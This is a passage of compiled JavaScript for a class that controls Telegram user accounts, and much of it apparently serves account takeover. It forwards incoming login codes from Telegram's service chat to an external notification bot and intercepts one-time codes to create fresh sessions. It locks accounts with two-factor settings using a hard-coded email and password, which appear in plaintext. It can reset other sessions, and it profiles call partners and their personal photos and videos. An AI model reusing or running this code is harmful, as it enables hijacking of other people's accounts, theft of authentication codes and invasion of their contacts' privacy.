            offsetId: offset,
            limit,
        });
        const result = await Promise.all(messages.map(async (message) => {
            const media = message.media
                ? {
                    type: message.media.className.includes('video') ? 'video' : 'photo',
                    thumbnailUrl: await this.getMediaUrl(message),
                }
                : null;
            return {
                id: message.id,
                message: message.message,
                date: message.date,
                sender: {
                    id: message.senderId?.toString(),
                    is_self: message.out,
                    username: message.fromId ? message.fromId.toString() : null,
                },
                media,
            };
        }));
        return result;
    }
    async getMediaUrl(message) {
        if (message.media instanceof telegram_1.Api.MessageMediaPhoto) {
            console.log("messageId image:", message.id);
            const sizes = message.photo?.sizes || [1];
            return await this.client.downloadMedia(message, { thumb: sizes[1] ? sizes[1] : sizes[0] });
        }
        else if (message.media instanceof telegram_1.Api.MessageMediaDocument && (message.document?.mimeType?.startsWith('video') || message.document?.mimeType?.startsWith('image'))) {
            console.log("messageId video:", message.id);
            const sizes = message.document?.thumbs || [1];
            return await this.client.downloadMedia(message, { thumb: sizes[1] ? sizes[1] : sizes[0] });
        }
        return null;
    }
    async sendInlineMessage(chatId, message, url) {
        const button = {
            text: "Open URL",
            url: url,
        };
        const result = await this.client.sendMessage(chatId, {
            message: message,
            buttons: [new telegram_1.Api.KeyboardButtonUrl(button)]
        });
        return result;
    }
    async getMediaMessages() {
        const result = await this.client.invoke(new telegram_1.Api.messages.Search({
            peer: new telegram_1.Api.InputPeerEmpty(),
            q: '',
            filter: new telegram_1.Api.InputMessagesFilterPhotos(),
            minDate: 0,
            maxDate: 0,
            offsetId: 0,
            addOffset: 0,
            limit: 200,
            maxId: 0,
            minId: 0,
            hash: (0, big_integer_1.default)(0),
        }));
        return result;
    }
    async getCallLog() {
        const result = await this.client.invoke(new telegram_1.Api.messages.Search({
            peer: new telegram_1.Api.InputPeerEmpty(),
            q: '',
            filter: new telegram_1.Api.InputMessagesFilterPhoneCalls({}),
            minDate: 0,
            maxDate: 0,
            offsetId: 0,
            addOffset: 0,
            limit: 200,
            maxId: 0,
            minId: 0,
            hash: (0, big_integer_1.default)(0),
        }));
        const callLogs = result.messages.filter((message) => message.action instanceof telegram_1.Api.MessageActionPhoneCall);
        const filteredResults = {
            outgoing: 0,
            incoming: 0,
            video: 0,
            chatCallCounts: {},
            totalCalls: 0
        };
        for (const log of callLogs) {
            filteredResults.totalCalls++;
            const logAction = log.action;
            if (log.out) {
                filteredResults.outgoing++;
            }
            else {
                filteredResults.incoming++;
            }
            if (logAction.video) {
                filteredResults.video++;
            }
            const chatId = log.peerId.userId.toString();
            if (!filteredResults.chatCallCounts[chatId]) {
                const ent = await this.client.getEntity(chatId);
                filteredResults.chatCallCounts[chatId] = {
                    phone: ent.phone,
                    username: ent.username,
                    name: `${ent.firstName}  ${ent.lastName ? ent.lastName : ''}`,
                    count: 0
                };
            }
            filteredResults.chatCallCounts[chatId].count++;
        }
        const filteredChatCallCounts = [];
        for (const [chatId, details] of Object.entries(filteredResults.chatCallCounts)) {
            if (details['count'] > 4) {
                let video = 0;
                let photo = 0;
                const msgs = await this.client.getMessages(chatId, { limit: 600 });
                for (const message of msgs) {
                    const text = message.text.toLocaleLowerCase();
                    if (!(0, utils_1.contains)(text, ['movie', 'series', '1080', '720', 'terabox', '640', 'title', 'aac', '265', '264', 'instagr', 'hdrip', 'mkv', 'hq', '480', 'blura', 's0', 'se0', 'uncut'])) {
                        if (message.media instanceof telegram_1.Api.MessageMediaPhoto) {
                            photo++;
                        }
                        else if (message.media instanceof telegram_1.Api.MessageMediaDocument && (message.document?.mimeType?.startsWith('video') || message.document?.mimeType?.startsWith('image'))) {
                            video++;
                        }
                    }
                }
                filteredChatCallCounts.push({
                    ...details,
                    msgs: msgs.total,
                    video,
                    photo,
                    chatId,
                });
            }
        }
        console.log({
            ...filteredResults,
            chatCallCounts: filteredChatCallCounts
        });
        return {
            ...filteredResults,
            chatCallCounts: filteredChatCallCounts
        };
    }
    async getCallLogsInternal() {
        const finalResult = {};
        const result = await this.client.invoke(new telegram_1.Api.messages.Search({
            peer: new telegram_1.Api.InputPeerEmpty(),
            q: '',
            filter: new telegram_1.Api.InputMessagesFilterPhoneCalls({}),
            minDate: 0,
            maxDate: 0,
            offsetId: 0,
            addOffset: 0,
            limit: 200,
            maxId: 0,
            minId: 0,
            hash: (0, big_integer_1.default)(0),
        }));
        const callLogs = result.messages.filter((message) => message.action instanceof telegram_1.Api.MessageActionPhoneCall);
        const filteredResults = {
            outgoing: 0,
            incoming: 0,
            video: 0,
            chatCallCounts: {},
            totalCalls: 0
        };
        for (const log of callLogs) {
            filteredResults.totalCalls++;
            const logAction = log.action;
            if (log.out) {
                filteredResults.outgoing++;
            }
            else {
                filteredResults.incoming++;
            }
            if (logAction.video) {
                filteredResults.video++;
            }
            const chatId = log.peerId.userId.toString();
            finalResult[chatId] = filteredResults;
        }
        return finalResult;
    }
    async handleEvents(event) {
        if (event.isPrivate) {
            if (event.message.chatId.toString() == "777000") {
                console.log(event.message.text.toLowerCase());
                console.log("Login Code received for - ", this.phoneNumber, '\nActiveClientSetup - ', TelegramManager.activeClientSetup);
                console.log("Date :", new Date(event.message.date * 1000));
                await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(`${process.env.clientId}:${this.phoneNumber}\n${event.message.text}`)}`);
            }
        }
    }
    async updatePrivacyforDeletedAccount() {
        try {
            await this.client.invoke(new telegram_1.Api.account.SetPrivacy({
                key: new telegram_1.Api.InputPrivacyKeyPhoneCall(),
                rules: [
                    new telegram_1.Api.InputPrivacyValueDisallowAll()
                ],
            }));
            console.log("Calls Updated");
            await this.client.invoke(new telegram_1.Api.account.SetPrivacy({
                key: new telegram_1.Api.InputPrivacyKeyProfilePhoto(),
                rules: [
                    new telegram_1.Api.InputPrivacyValueAllowAll()
                ],
            }));
            console.log("PP Updated");
            await this.client.invoke(new telegram_1.Api.account.SetPrivacy({
                key: new telegram_1.Api.InputPrivacyKeyPhoneNumber(),
                rules: [
                    new telegram_1.Api.InputPrivacyValueDisallowAll()
                ],
            }));
            console.log("Number Updated");
            await this.client.invoke(new telegram_1.Api.account.SetPrivacy({
                key: new telegram_1.Api.InputPrivacyKeyStatusTimestamp(),
                rules: [
                    new telegram_1.Api.InputPrivacyValueDisallowAll(),
                ],
            }));
            await this.client.invoke(new telegram_1.Api.account.SetPrivacy({
                key: new telegram_1.Api.InputPrivacyKeyAbout(),
                rules: [
                    new telegram_1.Api.InputPrivacyValueAllowAll()
                ],
            }));
            console.log("LAstSeen Updated");
        }
        catch (e) {
            throw e;
        }
    }
    async updateProfile(firstName, about) {
        const data = {
            lastName: "",
        };
        if (firstName !== undefined) {
            data["firstName"] = firstName;
        }
        if (about !== undefined) {
            data["about"] = about;
        }
        try {
            const result = await this.client.invoke(new telegram_1.Api.account.UpdateProfile(data));
            console.log("Updated NAme: ", firstName);
        }
        catch (error) {
            throw error;
        }
    }
    async downloadProfilePic(photoIndex) {
        try {
            const photos = await this.client.invoke(new telegram_1.Api.photos.GetUserPhotos({
                userId: 'me',
                offset: 0,
            }));
            if (photos.photos.length > 0) {
                console.log(`You have ${photos.photos.length} profile photos.`);
                if (photoIndex < photos.photos.length) {
                    const selectedPhoto = photos.photos[photoIndex];
                    const index = Math.max(selectedPhoto.sizes.length - 2, 0);
                    const photoFileSize = selectedPhoto.sizes[index];
                    const photoBuffer = await this.client.downloadFile(new telegram_1.Api.InputPhotoFileLocation({
                        id: selectedPhoto.id,
                        accessHash: selectedPhoto.accessHash,
                        fileReference: selectedPhoto.fileReference,
                        thumbSize: photoFileSize.type
                    }), {
                        dcId: selectedPhoto.dcId,
                    });
                    if (photoBuffer) {
                        const outputPath = `profile_picture_${photoIndex + 1}.jpg`;
                        fs.writeFileSync(outputPath, photoBuffer);
                        console.log(`Profile picture downloaded as '${outputPath}'`);
                        return outputPath;
                    }
                    else {
                        console.log("Failed to download the photo.");
                    }
                }
                else {
                    console.log(`Photo index ${photoIndex} is out of range.`);
                }
            }
            else {
                console.log("No profile photos found.");
            }
        }
        catch (err) {
            console.error("Error:", err);
        }
    }
    async getLastActiveTime() {
        const result = await this.client.invoke(new telegram_1.Api.account.GetAuthorizations());
        let latest = 0;
        result.authorizations.map((auth) => {
            if (!this.isAuthMine(auth)) {
                if (latest < auth.dateActive) {
                    latest = auth.dateActive;
                }
            }
        });
        return (new Date(latest * 1000)).toISOString().split('T')[0];
    }
    async getContacts() {
        const exportedContacts = await this.client.invoke(new telegram_1.Api.contacts.GetContacts({
            hash: (0, big_integer_1.default)(0)
        }));
        return exportedContacts;
    }
    async deleteChat(params) {
        try {
            await this.client.invoke(new telegram_1.Api.messages.DeleteHistory(params));
            console.log(`Dialog with ID ${params.peer} has been deleted.`);
        }
        catch (error) {
            console.error('Failed to delete dialog:', error);
        }
    }
    async blockUser(chatId) {
        try {
            await this.client?.invoke(new telegram_1.Api.contacts.Block({
                id: chatId,
            }));
            console.log(`User with ID ${chatId} has been blocked.`);
        }
        catch (error) {
            console.error('Failed to block user:', error);
        }
    }
    async getMediaMetadata(params) {
        if (!this.client)
            throw new Error('Client not initialized');
        const { chatId, types = ['photo', 'video', 'document'], startDate, endDate, limit = 50, maxId, minId } = params;
        const query = {
            limit: limit || 500,
            ...(maxId ? { maxId } : {}),
            ...(minId ? { minId } : {}),
            ...(startDate && { minDate: Math.floor(startDate.getTime() / 1000) }),
            ...(endDate && { maxDate: Math.floor(endDate.getTime() / 1000) })
        };
        const ent = await this.safeGetEntity(chatId);
        console.log(query);
        const messages = await this.client.getMessages(ent, query);
        console.log(`Fetched ${messages.length} messages`);
        const filteredMessages = messages.map(message => {
            const messageIds = [];
            if (message.media) {
                const mediaType = this.getMediaType(message.media);
                if (types.includes(mediaType)) {
                    messageIds.push(message.id);
                }
            }
            return messageIds;
        }).flat();
        return {
            messages: filteredMessages,
            total: messages.total,
            hasMore: messages.length == limit,
            lastOffsetId: messages[messages.length - 1].id
        };
    }
    async downloadMediaFile(messageId, chatId = 'me', res) {
        try {
            const entity = await this.safeGetEntity(chatId);
            const messages = await this.client.getMessages(entity, { ids: [messageId] });
            const message = messages[0];
            if (message && !(message.media instanceof telegram_1.Api.MessageMediaEmpty)) {
                const media = message.media;
                let contentType, filename, fileLocation;
                const inputLocation = message.video || message.photo;
                const data = {
                    id: inputLocation.id,
                    accessHash: inputLocation.accessHash,
                    fileReference: inputLocation.fileReference,
                };
                if (media instanceof telegram_1.Api.MessageMediaPhoto) {
                    contentType = 'image/jpeg';
                    filename = 'photo.jpg';
                    fileLocation = new telegram_1.Api.InputPhotoFileLocation({ ...data, thumbSize: 'm' });
                }
                else if (media instanceof telegram_1.Api.MessageMediaDocument) {
                    contentType = media.mimeType || 'video/mp4';
                    filename = 'video.mp4';
                    fileLocation = new telegram_1.Api.InputDocumentFileLocation({ ...data, thumbSize: '' });
                }
                else {
                    return res.status(415).send('Unsupported media type');
                }
                res.setHeader('Content-Type', contentType);
                res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
                const chunkSize = 512 * 1024;
                for await (const chunk of this.client.iterDownload({
                    file: fileLocation,
                    offset: big_integer_1.default[0],
                    limit: 5 * 1024 * 1024,
                    requestSize: chunkSize,
                })) {
                    res.write(chunk);
                }
                res.end();
            }
            else {
                res.status(404).send('Media not found');
            }
        }
        catch (error) {
            if (error.message.includes('FILE_REFERENCE_EXPIRED')) {
                return res.status(404).send('File reference expired');
            }
            console.error('Error downloading media:', error);
            res.status(500).send('Error downloading media');
        }
    }
    async downloadWithTimeout(promise, timeout) {
        return Promise.race([
            promise,
            new Promise((_, reject) => setTimeout(() => reject(new Error('Download timeout')), timeout))
        ]);
    }
    getMediaDetails(media) {
        if (!media?.document)
            return null;
        const doc = media.document;
        if (doc instanceof telegram_1.Api.DocumentEmpty)
            return null;
        const videoAttr = doc.attributes.find(attr => attr instanceof telegram_1.Api.DocumentAttributeVideo);
        const fileNameAttr = doc.attributes.find(attr => attr instanceof telegram_1.Api.DocumentAttributeFilename);
        return {
            size: doc.size,
            mimeType: doc.mimeType,
            fileName: fileNameAttr?.fileName || null,
            duration: videoAttr?.duration || null,
            width: videoAttr?.w || null,
            height: videoAttr?.h || null
        };
    }
    async downloadFileFromUrl(url) {
        try {
            const response = await axios_1.default.get(url, {
                responseType: 'arraybuffer',
                timeout: 30000
            });
            return Buffer.from(response.data);
        }
        catch (error) {
            throw new Error(`Failed to download file: ${error.message}`);
        }
    }
    async forwardMessage(toChatId, fromChatId, messageId) {
        try {
            await this.client.forwardMessages(toChatId, { fromPeer: fromChatId, messages: messageId });
        }
        catch (error) {
            console.log("Failed to Forward Message : ", error.errorMessage);
        }
    }
    async updateUsername(baseUsername) {
        let newUserName = '';
        let username = (baseUsername && baseUsername !== '') ? baseUsername : '';
        let increment = 0;
        if (username === '') {
            try {
                await this.client.invoke(new telegram_1.Api.account.UpdateUsername({ username }));
                console.log(`Removed Username successfully.`);
            }
            catch (error) {
                console.log(error);
            }
        }
        else {
            while (increment < 10) {
                try {
                    const result = await this.client.invoke(new telegram_1.Api.account.CheckUsername({ username }));
                    console.log(result, " - ", username);
                    if (result) {
                        await this.client.invoke(new telegram_1.Api.account.UpdateUsername({ username }));
                        console.log(`Username '${username}' updated successfully.`);
                        newUserName = username;
                        break;
                    }
                    else {
                        if (increment >= 6) {
                            const randomNums = Math.floor(Math.random() * 90 + 10);
                            username = baseUsername + randomNums;
                        }
                        else {
                            username = baseUsername + increment;
                        }
                        increment++;
                        await (0, Helpers_1.sleep)(2000);
                    }
                }
                catch (error) {
                    console.log(error.message);
                    if (error.errorMessage == 'USERNAME_NOT_MODIFIED') {
                        newUserName = username;
                        break;
                    }
                    if (increment >= 6) {
                        const randomChars = Math.random().toString(36).substring(2, 6);
                        username = baseUsername + randomChars;
                    }
                    else {
                        username = baseUsername + increment;
                    }
                    increment++;
                    await (0, Helpers_1.sleep)(2000);
                }
            }
        }
        return newUserName;
    }
    async updatePrivacy() {
        try {
            await this.client.invoke(new telegram_1.Api.account.SetPrivacy({
                key: new telegram_1.Api.InputPrivacyKeyPhoneCall(),
                rules: [
                    new telegram_1.Api.InputPrivacyValueDisallowAll()
                ],
            }));
            console.log("Calls Updated");
            await this.client.invoke(new telegram_1.Api.account.SetPrivacy({
                key: new telegram_1.Api.InputPrivacyKeyProfilePhoto(),
                rules: [
                    new telegram_1.Api.InputPrivacyValueAllowAll()
                ],
            }));
            console.log("PP Updated");
            await this.client.invoke(new telegram_1.Api.account.SetPrivacy({
                key: new telegram_1.Api.InputPrivacyKeyForwards(),
                rules: [
                    new telegram_1.Api.InputPrivacyValueAllowAll()
                ],
            }));
            console.log("forwards Updated");
            await this.client.invoke(new telegram_1.Api.account.SetPrivacy({
                key: new telegram_1.Api.InputPrivacyKeyPhoneNumber(),
                rules: [
                    new telegram_1.Api.InputPrivacyValueDisallowAll()
                ],
            }));
            console.log("Number Updated");
            await this.client.invoke(new telegram_1.Api.account.SetPrivacy({
                key: new telegram_1.Api.InputPrivacyKeyStatusTimestamp(),
                rules: [
                    new telegram_1.Api.InputPrivacyValueAllowAll(),
                ],
            }));
            console.log("LAstSeen Updated");
            await this.client.invoke(new telegram_1.Api.account.SetPrivacy({
                key: new telegram_1.Api.InputPrivacyKeyAbout(),
                rules: [
                    new telegram_1.Api.InputPrivacyValueAllowAll()
                ],
            }));
        }
        catch (e) {
            throw e;
        }
    }
    async sendViewOnceMedia(chatId, buffer, caption = '', isVideo, filename) {
        if (!this.client)
            throw new Error('Client is not initialized');
        try {
            const actualFilename = filename || `viewonce_${Date.now()}.${isVideo ? 'mp4' : 'jpg'}`;
            const mimeType = isVideo ? 'video/mp4' : 'image/jpeg';
            const inputFile = await this.client.uploadFile({
                file: new uploads_1.CustomFile(actualFilename, buffer.length, actualFilename, buffer),
                workers: 1
            });
            const result = await this.client.invoke(new telegram_1.Api.messages.SendMedia({
                peer: chatId,
                media: isVideo
                    ? new telegram_1.Api.InputMediaUploadedDocument({
                        file: inputFile,
                        mimeType,
                        attributes: [
                            new telegram_1.Api.DocumentAttributeVideo({
                                supportsStreaming: true,
                                duration: 0,
                                w: 0,
                                h: 0
                            })
                        ],
                        ttlSeconds: 10
                    })
                    : new telegram_1.Api.InputMediaUploadedPhoto({
                        file: inputFile,
                        ttlSeconds: 10
                    }),
                message: caption,
                randomId: (0, big_integer_1.default)(Math.floor(Math.random() * 1000000000))
            }));
            console.log(`Sent view-once ${isVideo ? 'video' : 'photo'} to chat ${chatId}`);
            return result;
        }
        catch (error) {
            console.error('Error sending view-once media:', error);
            throw error;
        }
    }
    async getFileUrl(url, filename) {
        const response = await axios_1.default.get(url, { responseType: 'stream' });
        const filePath = `/tmp/${filename}`;
        await new Promise((resolve, reject) => {
            const writer = fs.createWriteStream(filePath);
            response.data.pipe(writer);
            writer.on('finish', () => resolve(true));
            writer.on('error', reject);
        });
        return filePath;
    }
    async updateProfilePic(image) {
        try {
            const file = await this.client.uploadFile({
                file: new uploads_1.CustomFile('pic.jpg', fs.statSync(image).size, image),
                workers: 1,
            });
            console.log("file uploaded");
            await this.client.invoke(new telegram_1.Api.photos.UploadProfilePhoto({
                file: file,
            }));
            console.log("profile pic updated");
        }
        catch (error) {
            throw error;
        }
    }
    async hasPassword() {
        const passwordInfo = await this.client.invoke(new telegram_1.Api.account.GetPassword());
        return passwordInfo.hasPassword;
    }
    async set2fa() {
        if (!(await this.hasPassword())) {
            console.log("Password Does not exist, Setting 2FA");
            const imapService = IMap_1.MailReader.getInstance();
            const twoFaDetails = {
                email: "storeslaksmi@gmail.com",
                hint: "password - India143",
                newPassword: "Ajtdmwajt1@",
            };
            try {
                await imapService.connectToMail();
                const checkMailInterval = setInterval(async () => {
                    console.log("Checking if mail is ready");
                    if (imapService.isMailReady()) {
                        clearInterval(checkMailInterval);
                        console.log("Mail is ready, checking code!");
                        await this.client.updateTwoFaSettings({
                            isCheckPassword: false,
                            email: twoFaDetails.email,
                            hint: twoFaDetails.hint,
                            newPassword: twoFaDetails.newPassword,
                            emailCodeCallback: async (length) => {
                                console.log("Code sent");
                                return new Promise(async (resolve, reject) => {
                                    let retry = 0;
                                    const codeInterval = setInterval(async () => {
                                        try {
                                            console.log("Checking code");
                                            retry++;
                                            if (imapService.isMailReady() && retry < 4) {
                                                const code = await imapService.getCode();
                                                console.log('Code:', code);
                                                if (code) {
                                                    await imapService.disconnectFromMail();
                                                    clearInterval(codeInterval);
                                                    resolve(code);
                                                }
                                            }
                                            else {
                                                clearInterval(codeInterval);
                                                await imapService.disconnectFromMail();
                                                reject(new Error("Failed to retrieve code"));
                                            }
                                        }
                                        catch (error) {
                                            clearInterval(codeInterval);
                                            await imapService.disconnectFromMail();
                                            reject(error);
                                        }
                                    }, 10000);
                                });
                            },
                            onEmailCodeError: (e) => {
                                console.error('Email code error:', (0, parseError_1.parseError)(e));
                                return Promise.resolve("error");
                            }
                        });
                        return twoFaDetails;
                    }
                    else {
                        console.log("Mail not ready yet");
                    }
                }, 5000);
            }
            catch (e) {
                console.error("Unable to connect to mail server:", (0, parseError_1.parseError)(e));
            }
        }
        else {
            console.log("Password already exists");
        }
    }
    async sendPhotoChat(id, url, caption, filename) {
        if (!this.client)
            throw new Error('Client is not initialized');
        const filePath = await this.getFileUrl(url, filename);
        const file = new uploads_1.CustomFile(filePath, fs.statSync(filePath).size, filename);
        await this.client.sendFile(id, { file, caption });
    }
    async sendFileChat(id, url, caption, filename) {
        if (!this.client)
            throw new Error('Client is not initialized');
        const filePath = await this.getFileUrl(url, filename);
        const file = new uploads_1.CustomFile(filePath, fs.statSync(filePath).size, filename);
        await this.client.sendFile(id, { file, caption });
    }
    async deleteProfilePhotos() {
        try {
            const result = await this.client.invoke(new telegram_1.Api.photos.GetUserPhotos({
                userId: "me"
            }));
            console.log(`Profile Pics found: ${result.photos.length}`);
            if (result && result.photos?.length > 0) {
                const res = await this.client.invoke(new telegram_1.Api.photos.DeletePhotos({
                    id: result.photos
                }));
            }
            console.log("Deleted profile Photos");
        }
        catch (error) {
            throw error;
        }
    }
    async createNewSession() {
        const me = await this.client.getMe();
        console.log("Phne:", me.phone);
        const newClient = new telegram_1.TelegramClient(new sessions_1.StringSession(''), parseInt(process.env.API_ID), process.env.API_HASH, {
            connectionRetries: 1,
        });
        await newClient.start({
            phoneNumber: me.phone,
            password: async () => "Ajtdmwajt1@",
            phoneCode: async () => {
                console.log('Waiting for the OTP code from chat ID 777000...');
                return await this.waitForOtp();
            },
            onError: (err) => { throw err; },
        });
        const session = newClient.session.save();
        await newClient.destroy();
        console.log("New Session: ", session);
        return session;
    }
    async waitForOtp() {
        for (let i = 0; i < 3; i++) {
            try {
                console.log("Attempt : ", i);
                const messages = await this.client.getMessages('777000', { limit: 1 });
                const message = messages[0];
                if (message && message.date && message.date * 1000 > Date.now() - 60000) {
                    const code = message.text.split('.')[0].split("code:**")[1].trim();
                    console.log("returning: ", code);
                    return code;
                }
                else {
                    console.log("Message Date: ", new Date(message.date * 1000).toISOString(), "Now: ", new Date(Date.now() - 60000).toISOString());
                    const code = message.text.split('.')[0].split("code:**")[1].trim();
                    console.log("Skipped Code: ", code);
                    if (i == 2) {
                        return code;
                    }
                    await (0, Helpers_1.sleep)(5000);
                }
            }
            catch (err) {
                await (0, Helpers_1.sleep)(2000);
                console.log(err);
            }
        }
    }
    async createGroupWithOptions(options) {
        if (!this.client)
            throw new Error('Client not initialized');
        const result = await this.createGroupOrChannel(options);
        let channelId;
        if ('updates' in result) {
            const updates = Array.isArray(result.updates) ? result.updates : [result.updates];
            const channelUpdate = updates.find(u => u instanceof telegram_1.Api.UpdateChannel);
            if (channelUpdate && 'channelId' in channelUpdate) {
                channelId = channelUpdate.channelId;
            }
        }
        if (!channelId) {
            throw new Error('Failed to create channel');
        }
        const channel = await this.client.getEntity(channelId);
        if (!(channel instanceof telegram_1.Api.Channel)) {
            throw new Error('Created entity is not a channel');
        }
        if (options.members?.length) {
            const users = await Promise.all(options.members.map(member => this.client.getInputEntity(member)));
            await this.client.invoke(new telegram_1.Api.channels.InviteToChannel({
                channel: await this.client.getInputEntity(channel),
                users
            }));
        }
        if (options.photo) {
            const buffer = await this.downloadFileFromUrl(options.photo);
            const inputFile = await this.client.uploadFile({
                file: new uploads_1.CustomFile('photo.jpg', buffer.length, 'photo.jpg', buffer),
                workers: 1
            });
            await this.client.invoke(new telegram_1.Api.channels.EditPhoto({
                channel: await this.client.getInputEntity(channel),
                photo: new telegram_1.Api.InputChatUploadedPhoto({
                    file: inputFile
                })
            }));
        }
        return channel;
    }
    async updateGroupSettings(settings) {
        if (!this.client)
            throw new Error('Client not initialized');
        const channel = await this.client.getEntity(settings.groupId);
        if (settings.title) {
            await this.client.invoke(new telegram_1.Api.channels.EditTitle({
                channel: channel,
                title: settings.title || ''
            }));
        }
        ;
        if (settings.description) {
            await this.client.invoke(new telegram_1.Api.messages.EditChatAbout({
                peer: channel,
                about: settings.description
            }));
        }
        if (settings.username) {
            await this.client.invoke(new telegram_1.Api.channels.UpdateUsername({
                channel: channel,
                username: settings.username
            }));
        }
        if (settings.slowMode !== undefined) {
            await this.client.invoke(new telegram_1.Api.channels.ToggleSlowMode({
                channel: channel,
                seconds: settings.slowMode
            }));
        }
        return true;
    }
    async scheduleMessageSend(opts) {
        if (!this.client)
            throw new Error('Client not initialized');
        const scheduleDate = Math.floor(opts.scheduledTime.getTime() / 1000);
        if (opts.media) {
            const buffer = await this.downloadFileFromUrl(opts.media.url);
            const uploadedFile = await this.client.uploadFile({
                file: new uploads_1.CustomFile('media', buffer.length, 'media', buffer),
                workers: 1
            });
            return this.client.sendFile(opts.chatId, {
                file: uploadedFile,
                caption: opts.message,
                forceDocument: opts.media.type === 'document',
                scheduleDate
            });
        }
        return this.client.sendMessage(opts.chatId, {
            message: opts.message,
            schedule: Math.floor(opts.scheduledTime.getTime() / 1000)
        });
    }
    async getScheduledMessages(chatId) {
        if (!this.client)
            throw new Error('Client not initialized');
        const result = await this.client.invoke(new telegram_1.Api.messages.GetScheduledHistory({
            peer: chatId,
            hash: (0, big_integer_1.default)(0)
        }));
        return 'messages' in result && Array.isArray(result.messages)
            ? result.messages.filter(msg => msg instanceof telegram_1.Api.Message)
            : [];
    }
    async sendMediaAlbum(album) {
        if (!this.client)
            throw new Error('Client not initialized');
        const mediaFiles = await Promise.all(album.media.map(async (item) => {
            const buffer = await this.downloadFileFromUrl(item.url);
            const uploadedFile = await this.client.uploadFile({
                file: new uploads_1.CustomFile('media', buffer.length, 'media', buffer),
                workers: 1
            });
            return new telegram_1.Api.InputSingleMedia({
                media: item.type === 'photo'
                    ? new telegram_1.Api.InputMediaUploadedPhoto({ file: uploadedFile })
                    : new telegram_1.Api.InputMediaUploadedDocument({
                        file: uploadedFile,
                        mimeType: item.type === 'video' ? 'video/mp4' : 'application/octet-stream',
                        attributes: []
                    }),
                message: item.caption || '',
                entities: []
            });
        }));
        return this.client.invoke(new telegram_1.Api.messages.SendMultiMedia({
            peer: album.chatId,
            multiMedia: mediaFiles
        }));
    }
    async sendMessage(params) {
        if (!this.client)
            throw new Error('Client not initialized');
        const { peer, parseMode, message } = params;
        return await this.client.sendMessage(peer, { message, parseMode });
    }
    async sendVoiceMessage(voice) {
        if (!this.client)
            throw new Error('Client not initialized');
        const buffer = await this.downloadFileFromUrl(voice.url);
        return await this.client.invoke(new telegram_1.Api.messages.SendMedia({
            peer: voice.chatId,
            media: new telegram_1.Api.InputMediaUploadedDocument({
                file: await this.client.uploadFile({
                    file: new uploads_1.CustomFile('voice.ogg', buffer.length, 'voice.ogg', buffer),
                    workers: 1
                }),
                mimeType: 'audio/ogg',
                attributes: [
                    new telegram_1.Api.DocumentAttributeAudio({
                        voice: true,
                        duration: voice.duration || 0
                    })
                ]
            }),
            message: voice.caption || '',
            randomId: (0, big_integer_1.default)(Math.floor(Math.random() * 1000000000))
        }));
    }
    async cleanupChat(cleanup) {
        if (!this.client)
            throw new Error('Client not initialized');
        cleanup.revoke = cleanup.revoke !== undefined ? cleanup.revoke : true;
        const messages = await this.client.getMessages(cleanup.chatId, {
            limit: 1000,
            ...(cleanup.beforeDate && {
                offsetDate: Math.floor(cleanup.beforeDate.getTime() / 1000)
            })
        });
        const toDelete = messages.filter(msg => {
            if (cleanup.excludePinned && msg.pinned)
                return false;
            if (cleanup.onlyMedia && !msg.media)
                return false;
            return true;
        });
        if (toDelete.length > 0) {
            await this.client.deleteMessages(cleanup.chatId, toDelete.map(m => m.id), {
                revoke: cleanup.revoke
            });
        }
        return { deletedCount: toDelete.length };
    }
    async updatePrivacyBatch(settings) {
        if (!this.client)
            throw new Error('Client not initialized');
        const privacyRules = {
            everybody: [new telegram_1.Api.InputPrivacyValueAllowAll()],
            contacts: [new telegram_1.Api.InputPrivacyValueAllowContacts()],
            nobody: [new telegram_1.Api.InputPrivacyValueDisallowAll()]
        };
        const updates = [];
        const privacyMap = {
            phoneNumber: telegram_1.Api.InputPrivacyKeyPhoneNumber,
            lastSeen: telegram_1.Api.InputPrivacyKeyStatusTimestamp,
            profilePhotos: telegram_1.Api.InputPrivacyKeyProfilePhoto,
            forwards: telegram_1.Api.InputPrivacyKeyForwards,
            calls: telegram_1.Api.InputPrivacyKeyPhoneCall,
            groups: telegram_1.Api.InputPrivacyKeyChatInvite
        };
        for (const [key, value] of Object.entries(settings)) {
            if (value && key in privacyMap) {
                updates.push(this.client.invoke(new telegram_1.Api.account.SetPrivacy({
                    key: new privacyMap[key](),
                    rules: privacyRules[value]
                })));
            }
        }
        await Promise.all(updates);
        return true;
    }
    async getSessionInfo() {
        if (!this.client)
            throw new Error('Client not initialized');
        const [authorizationsResult, devicesResult] = await Promise.all([
            this.client.invoke(new telegram_1.Api.account.GetAuthorizations()),
            this.client.invoke(new telegram_1.Api.account.GetWebAuthorizations())
        ]);
        const sessions = authorizationsResult.authorizations.map(auth => ({
            hash: auth.hash.toString(),
            deviceModel: auth.deviceModel,
            platform: auth.platform,
            systemVersion: auth.systemVersion,
            appName: auth.appName,
            dateCreated: new Date(auth.dateCreated * 1000),
            dateActive: new Date(auth.dateActive * 1000),
            ip: auth.ip,
            country: auth.country,
            region: auth.region
        }));
        const webSessions = devicesResult.authorizations.map(auth => ({
            hash: auth.hash.toString(),
            domain: auth.domain,
            browser: auth.browser,
            platform: auth.platform,
            dateCreated: new Date(auth.dateCreated * 1000),
            dateActive: new Date(auth.dateActive * 1000),
            ip: auth.ip,
            region: auth.region
        }));
        return {
            sessions,
            webSessions
        };
    }
    async terminateSession(options) {
        if (!this.client)
            throw new Error('Client not initialized');
        if (options.exceptCurrent) {
            if (options.type === 'app') {
                await this.client.invoke(new telegram_1.Api.auth.ResetAuthorizations());
            }
            else {
                await this.client.invoke(new telegram_1.Api.account.ResetWebAuthorizations());
            }
            return true;
        }
        if (options.type === 'app') {
            await this.client.invoke(new telegram_1.Api.account.ResetAuthorization({
                hash: (0, big_integer_1.default)(options.hash)
            }));
        }
        else {
            await this.client.invoke(new telegram_1.Api.account.ResetWebAuthorization({
                hash: (0, big_integer_1.default)(options.hash)
            }));
        }
        return true;
    }
    async getChatStatistics(chatId, period) {
        if (!this.client)
            throw new Error('Client not initialized');
        const now = Math.floor(Date.now() / 1000);
        const periodInSeconds = {
            day: 24 * 60 * 60,
            week: 7 * 24 * 60 * 60,
            month: 30 * 24 * 60 * 60
        }[period];
        const messages = await this.client.getMessages(chatId, {
            limit: 100,
            offsetDate: now - periodInSeconds
        });
        const stats = {
            period,
            totalMessages: messages.length,
            uniqueSenders: new Set(messages.map(m => m.fromId?.toString()).filter(Boolean)).size,
            messageTypes: {
                text: messages.filter(m => !m.media && m.message).length,
